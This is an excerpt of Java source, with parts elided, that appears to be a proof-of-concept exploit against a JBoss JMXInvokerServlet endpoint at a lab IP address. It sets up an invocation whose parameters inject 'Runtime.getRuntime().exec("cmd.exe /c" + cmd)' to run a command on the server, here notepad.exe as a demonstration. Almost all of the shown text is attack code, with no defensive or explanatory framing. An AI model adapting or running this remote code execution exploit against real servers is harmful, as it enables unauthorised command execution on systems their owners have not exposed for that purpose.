...
public class JMXInvokerServlet {
    ...
    static final String url = "http://192.168.228.129:8080/invoker/JMXInvokerServlet";
    static final String cmd = "notepad.exe";
    //-------------------------------
    ...
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, MalformedObjectNameException {
        ...
        //Actual parameters
        myObj[2] = new String[]{"Runtime.getRuntime().exec(\"" + "cmd.exe /c" + cmd + "\");", "Script Name"};
        //Operation signature
